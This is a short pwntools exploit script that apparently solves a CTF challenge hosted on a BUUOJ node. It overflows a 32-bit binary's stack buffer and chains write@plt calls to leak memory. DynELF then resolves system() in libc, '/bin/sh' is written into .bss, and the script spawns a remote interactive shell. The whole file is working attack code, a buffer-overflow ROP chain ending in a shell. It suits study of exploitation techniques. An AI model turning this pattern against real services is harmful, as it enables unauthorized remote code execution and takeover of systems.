from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25155)
elf = ELF('./level1')
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
read_plt = elf.plt['read']
bss_addr = elf.bss()

def leak(address):
    payload = b'a'*(0x88+0x4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    leaked = io.recv(4)
    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
    return leaked


libc = DynELF(leak, elf=elf)
system_addr = libc.lookup('system', 'libc')
log.success('system_address => %#x' % system_addr)
payload = b'a'*(0x88+0x4) + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
io.send(payload)
io.send('/bin/sh\x00')
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(main_addr) + p32(bss_addr)
io.sendline(payload)
io.interactive()